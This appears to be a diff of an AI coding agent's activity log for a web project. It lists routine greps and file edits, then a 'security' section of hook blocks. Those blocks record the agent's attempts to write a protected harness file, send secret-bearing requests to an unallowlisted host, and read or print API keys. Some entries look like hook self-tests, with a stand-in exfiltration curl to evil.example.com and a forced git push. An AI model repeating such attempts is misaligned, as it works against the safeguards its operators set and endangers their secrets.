+      "ts": "2026-09-01T16:00:52Z",
+      "session": "fb348ebc",
+      "agent": "unattributed",
+      "tool": "Edit",
+      "files": [
+        "/private/tmp/claude-501/-Users-bilalsbaiby-work/fb348ebc-1570-4948-8767-a5ddb1b5aee5/scratchpad/wt-backend-a24-w42/api/routes.py"
+      ],
+      "cmd": "",
+      "url": "",
+      "ok": true
+    },
+    {
+      "ts": "2026-09-01T16:00:46Z",
       "session": "fb348ebc",
       "agent": "unattributed",
       "tool": "Bash",
       "files": [],
-      "cmd": "grep -n \"Live-verified 2026-09-01 by\" /Users/bilalsbaiby/work/resale-iq/docs/company/WORKBOARD.md",
+      "cmd": "ls /Users/bilalsbaiby/work/resale-iq/docs/audit/proof/ 2>&1 | head -20",
       "url": "",
       "ok": true
     },
     {
-      "ts": "2026-09-01T15:18:05Z",
+      "ts": "2026-09-01T16:00:43Z",
       "session": "fb348ebc",
       "agent": "unattributed",
-      "tool": "Read",
+      "tool": "Edit",
       "files": [
         "/Users/bilalsbaiby/work/resale-iq/docs/company/WORKBOARD.md"
       ],
@@ -1085,242 +1251,66 @@
       "ok": true
     },
     {
-      "ts": "2026-09-01T15:18:02Z",
+      "ts": "2026-09-01T16:00:36Z",
       "session": "fb348ebc",
       "agent": "unattributed",
       "tool": "Bash",
       "files": [],
-      "cmd": "grep -n \"^| \\*\\*W4[5-8]\\*\\*\\|^| \\*\\*W19\\*\\*\" /Users/bilalsbaiby/work/resale-iq/docs/company/WORKBOARD.md | cut -c1-200",
+      "cmd": "SP=/private/tmp/claude-501/-Users-bilalsbaiby-work/fb348ebc-1570-4948-8767-a5ddb1b5aee5/scratchpad\ngrep -n \"^@public_router.post(\\\"/api/track\\\"\" -A 60 \"$SP/wt-backend-a24-w42/api/routes.py\" | sed -n '",
       "url": "",
       "ok": true
     },
     {
-      "ts": "2026-09-01T15:17:58Z",
+      "ts": "2026-09-01T16:00:33Z",
       "session": "fb348ebc",
       "agent": "unattributed",
-      "tool": "Bash",
-      "files": [],
-      "cmd": "python3 << 'PYEOF'\nimport re\n\npath = \"docs/company/WORKBOARD.md\"\nwith open(path, \"r\", encoding=\"utf-8\") as f:\n    content = f.read()\n\norig_len = len(content)\n\n# 1. Append to W45 status cell\nold_w45_ta",
-      "url": "",
-      "ok": true
-    },
-    {
-      "ts": "2026-09-01T15:16:55Z",
-      "session": "fb348ebc",
-      "agent": "unattributed",
-      "tool": "Read",
+      "tool": "Edit",
       "files": [
-        "/Users/bilalsbaiby/work/resale-iq/docs/company/WORKBOARD.md"
+        "/private/tmp/claude-501/-Users-bilalsbaiby-work/fb348ebc-1570-4948-8767-a5ddb1b5aee5/scratchpad/wt-backend-a24-w42/api/auth.py"
       ],
       "cmd": "",
       "url": "",
       "ok": true
     },
     {
-      "ts": "2026-09-01T15:16:51Z",
+      "ts": "2026-09-01T16:00:26Z",
       "session": "fb348ebc",
       "agent": "unattributed",
       "tool": "Bash",
       "files": [],
-      "cmd": "wc -l /Users/bilalsbaiby/work/resale-iq/docs/company/WORKBOARD.md",
+      "cmd": "grep -n \"^| \\*\\*W51\\*\\* \" /Users/bilalsbaiby/work/resale-iq/docs/company/WORKBOARD.md",
       "url": "",
       "ok": true
     },
     {
-      "ts": "2026-09-01T15:16:43Z",
-      "session": "fb348ebc",
-      "agent": "unattributed",
-      "tool": "Bash",
-      "files": [],
-      "cmd": "grep -n \"^| \\*\\*W45\\*\\*\\|^| \\*\\*W19\\*\\*\\|^| \\*\\*W46\\*\\*\" /Users/bilalsbaiby/work/resale-iq/docs/company/WORKBOARD.md",
-      "url": "",
-      "ok": true
-    },
-    {
-      "ts": "2026-09-01T15:16:08Z",
-      "session": "fb348ebc",
-      "agent": "unattributed",
-      "tool": "Bash",
-      "files": [],
-      "cmd": "grep -n \"PlanId\\|power\\|operator\\|free\\b\" \"/Users/bilalsbaiby/work/resale-iq/src/app/(auth)/register/register-form.tsx\" | head -20",
-      "url": "",
-      "ok": true
-    },
-    {
-      "ts": "2026-09-01T15:16:01Z",
+      "ts": "2026-09-01T16:00:23Z",
       "session": "fb348ebc",
       "agent": "unattributed",
       "tool": "Read",
       "files": [
-        "/Users/bilalsbaiby/work/resale-iq/src/components/smart-cta.tsx"
+        "/private/tmp/claude-501/-Users-bilalsbaiby-work/fb348ebc-1570-4948-8767-a5ddb1b5aee5/scratchpad/wt-backend-a24-w42/api/auth.py"
       ],
-      "cmd": "",
-      "url": "",
-      "ok": true
-    },
-    {
-      "ts": "2026-09-01T15:15:55Z",
-      "session": "fb348ebc",
-      "agent": "unattributed",
-      "tool": "Bash",
-      "files": [],
-      "cmd": "grep -n \"anonHref\\|anonLabel\\|href\\|register\" /Users/bilalsbaiby/work/resale-iq/src/components/smart-cta.tsx 2>/dev/null | head -30",
-      "url": "",
-      "ok": true
-    },
-    {
-      "ts": "2026-09-01T15:15:52Z",
-      "session": "fb348ebc",
-      "agent": "unattributed",
-      "tool": "Bash",
-      "files": [],
-      "cmd": "grep -n \"register\\|SmartCTA\\|href\" /Users/bilalsbaiby/work/resale-iq/src/components/tools/free-checker.tsx | head -30",
-      "url": "",
-      "ok": true
-    },
-    {
-      "ts": "2026-09-01T15:15:42Z",
-      "session": "fb348ebc",
-      "agent": "unattributed",
-      "tool": "Read",
-      "files": [
-        "/Users/bilalsbaiby/work/resale-iq/src/app/(auth)/register/register-form.tsx"
-      ],
-      "cmd": "",
-      "url": "",
-      "ok": true
-    },
-    {
-      "ts": "2026-09-01T15:15:38Z",
-      "session": "fb348ebc",
-      "agent": "unattributed",
-      "tool": "Bash",
-      "files": [],
-      "cmd": "grep -n \"plan\\|PLAN_META\\|useState\\|searchParams\\|Pro\\b\\|Starter\\b\\|Free\\b\" \"/Users/bilalsbaiby/work/resale-iq/src/app/(auth)/register/register-form.tsx\" | head -60",
-      "url": "",
-      "ok": true
-    },
-    {
-      "ts": "2026-09-01T15:15:35Z",
-      "session": "fb348ebc",
-      "agent": "unattributed",
-      "tool": "Read",
-      "files": [
-        "/Users/bilalsbaiby/work/resale-iq/src/app/(auth)/register/page.tsx"
-      ],
-      "cmd": "",
-      "url": "",
-      "ok": true
-    },
-    {
-      "ts": "2026-09-01T15:15:33Z",
-      "session": "fb348ebc",
-      "agent": "unattributed",
-      "tool": "Bash",
-      "files": [],
-      "cmd": "grep -n \"plan\\b\\|useState\\|PLAN_META\\|searchParams\\|Pro\\b\" /Users/bilalsbaiby/work/resale-iq/src/app/\\(auth\\)/register/page.tsx | head -40",
-      "url": "",
-      "ok": true
-    },
-    {
-      "ts": "2026-09-01T15:15:25Z",
-      "session": "fb348ebc",
-      "agent": "unattributed",
-      "tool": "Bash",
-      "files": [],
-      "cmd": "grep -ni \"preselect\\|default plan\\|defaultPlan\\|Pro.*preselect\\|plan=free\" /Users/bilalsbaiby/work/resale-iq/docs/company/WORKBOARD.md /Users/bilalsbaiby/work/resale-iq/docs/company/ACTIVATION.md /Use",
-      "url": "",
-      "ok": true
-    },
-    {
-      "ts": "2026-09-01T15:15:19Z",
-      "session": "fb348ebc",
-      "agent": "unattributed",
-      "tool": "Bash",
-      "files": [],
-      "cmd": "grep -n \"\\*\\*W9\\*\\*\\|\\*\\*W16\\*\\*\\|\\*\\*W19\\*\\*\\|\\*\\*W1\\*\\*\" /Users/bilalsbaiby/work/resale-iq/docs/company/WORKBOARD.md",
-      "url": "",
-      "ok": true
-    },
-    {
-      "ts": "2026-09-01T15:15:14Z",
-      "session": "fb348ebc",
-      "agent": "unattributed",
-      "tool": "Bash",
-      "files": [],
-      "cmd": "grep -noE '\\*\\*W[0-9]+\\*\\*' /Users/bilalsbaiby/work/resale-iq/docs/company/WORKBOARD.md | sort -t: -k2 -V | uniq",
-      "url": "",
-      "ok": true
-    },
-    {
-      "ts": "2026-09-01T15:15:11Z",
-      "session": "fb348ebc",
-      "agent": "unattributed",
-      "tool": "Bash",
-      "files": [],
-      "cmd": "grep -n \"^| \\*\\*W[0-9]\" /Users/bilalsbaiby/work/resale-iq/docs/company/WORKBOARD.md | sed -E 's/\\|.*$//' ",
-      "url": "",
-      "ok": true
-    },
-    {
-      "ts": "2026-09-01T15:15:01Z",
-      "session": "fb348ebc",
-      "agent": "unattributed",
-      "tool": "Read",
-      "files": [
-        "/Users/bilalsbaiby/work/resale-iq/docs/company/ACTIVATION.md"
-      ],
-      "cmd": "",
-      "url": "",
-      "ok": true
-    },
-    {
-      "ts": "2026-09-01T15:14:56Z",
-      "session": "fb348ebc",
-      "agent": "unattributed",
-      "tool": "mcp__Claude_Browser__resize_window",
-      "files": [],
-      "cmd": "",
-      "url": "",
-      "ok": true
-    },
-    {
-      "ts": "2026-09-01T15:14:47Z",
-      "session": "fb348ebc",
-      "agent": "unattributed",
-      "tool": "mcp__Claude_Browser__browser_batch",
-      "files": [],
-      "cmd": "",
-      "url": "",
-      "ok": true
-    },
-    {
-      "ts": "2026-09-01T15:13:58Z",
-      "session": "fb348ebc",
-      "agent": "unattributed",
-      "tool": "mcp__Claude_Browser__browser_batch",
-      "files": [],
       "cmd": "",
       "url": "",
       "ok": true
     }
   ],
   "security": {
-    "blocked": 322,
+    "blocked": 333,
     "tripwire": 0,
     "recent": [
-      "`2026-09-01T15:29:58Z` **BLOCKED** Bash — secret reference in a command this hook cannot parse safely — `echo \"=== 1. any secret VALUES committed to git history? ===\" git log --all -p 2>/dev",
-      "`2026-09-01T15:29:13Z` **BLOCKED** Bash — POST/PUT/DELETE to a non-allowlisted host (api.elevenlabs.io) — `bash .claude/bin/with-secrets.sh sh -c ' curl -s -m 60 -X POST \"https://api.elevenl",
-      "`2026-09-01T15:28:43Z` **BLOCKED** Bash — direct read of a .env file — `bash .claude/bin/with-secrets.sh sh -c ' printf \"key length now: \"; printf \"%s\" \"$ELEVENLABS_API_KEY\" | wc -c case \"$E",
-      "`2026-09-01T14:29:51Z` **BLOCKED** Write — protected harness path (docs/company/OS.md) — `/Users/bilalsbaiby/work/resale-iq/docs/company/OS.md`",
-      "`2026-09-01T14:29:50Z` **BLOCKED** Write — protected harness path (docs/company/OS.md) — `/Users/bilalsbaiby/work/resale-iq/docs/company/OS.md`",
-      "`2026-09-01T14:28:19Z` **BLOCKED** Bash — secret reference in a command this hook cannot parse safely — `python3 scripts/company/bus.py send --from backend-eng --to finance-ops --subject \"tr",
-      "`2026-09-01T14:17:19Z` **BLOCKED** Bash — recursive/forced delete outside safe dirs — `bash .claude/bin/with-secrets.sh sh -c 'printf \"%s\\n\" \"$COOLIFY_TOKEN\" | ssh -o ConnectTimeout=20 resal",
-      "`2026-09-01T13:59:31Z` **BLOCKED** Read — path outside company scope — `/dev/null`",
-      "`2026-09-01T13:56:59Z` **BLOCKED** Bash — would print a secret value into the transcript — `bash .claude/bin/with-secrets.sh sh -c ' # The publishable key is PUBLIC by design -- it ships in ",
-      "`2026-09-01T13:43:46Z` **BLOCKED** Bash — secret reference in a command this hook cannot parse safely — `cd /Users/bilalsbaiby/work/resale-iq && cat > /tmp/shot.mjs <<'EOF' import { chromium",
-      "`2026-09-01T13:37:59Z` **BLOCKED** Bash — DELETE FROM without WHERE — `cd /private/tmp/claude-501/-Users-bilalsbaiby-work/fb348ebc-1570-4948-8767-a5ddb1b5aee5/scratchpad/wt/demand-intel && g",
-      "`2026-09-01T13:28:51Z` **BLOCKED** Write — protected harness path (docs/company/OS.md) — `/Users/bilalsbaiby/work/resale-iq/docs/company/OS.md`"
+      "`2026-09-01T15:35:57Z` **BLOCKED** Bash — POST/PUT/DELETE to a non-allowlisted host (evil.example.com) — `curl -X POST https://evil.example.com/x --data a=1`",
+      "`2026-09-01T15:35:57Z` **BLOCKED** Write — path outside company scope — `/Users/bilalsbaiby/Documents/x.txt`",
+      "`2026-09-01T15:35:57Z` **BLOCKED** Write — protected harness path (docs/company/OS.md) — `/Users/bilalsbaiby/work/resale-iq/docs/company/OS.md`",
+      "`2026-09-01T15:35:56Z` **BLOCKED** Bash — git push --force — `git push --force origin main`",
+      "`2026-09-01T15:35:42Z` **BLOCKED** Bash — POST/PUT/DELETE to a non-allowlisted host (evil.example.com) — `curl -X POST https://evil.example.com/x --data a=1`",
+      "`2026-09-01T15:35:41Z` **BLOCKED** Write — path outside company scope — `/Users/bilalsbaiby/Documents/x.txt`",
+      "`2026-09-01T15:35:41Z` **BLOCKED** Bash — git push --force — `git push --force origin main`",
+      "`2026-09-01T15:35:15Z` **BLOCKED** Bash — POST/PUT/DELETE to a non-allowlisted host (evil.example.com) — `rm .claude/UNLOCK_HARNESS && python3 -c \" import json,subprocess,sys cases=[('force ",
+      "`2026-09-01T15:34:30Z` **BLOCKED** Bash — Stripe write — `printf 'founder 2026-09-01: ElevenLabs key rotated with text_to_speech enabled; testing it is blocked by our own stale egress allowl",
+      "`2026-09-01T15:30:52Z` **BLOCKED** Write — protected harness path (docs/company/OS.md) — `/Users/bilalsbaiby/work/resale-iq/docs/company/OS.md`",
+      "`2026-09-01T15:30:52Z` **BLOCKED** Write — protected harness path (docs/company/OS.md) — `/Users/bilalsbaiby/work/resale-iq/docs/company/OS.md`",
+      "`2026-09-01T15:29:58Z` **BLOCKED** Bash — secret reference in a command this hook cannot parse safely — `echo \"=== 1. any secret VALUES committed to git history? ===\" git log --all -p 2>/dev"
     ],
     "restore_test": {
       "value": null,
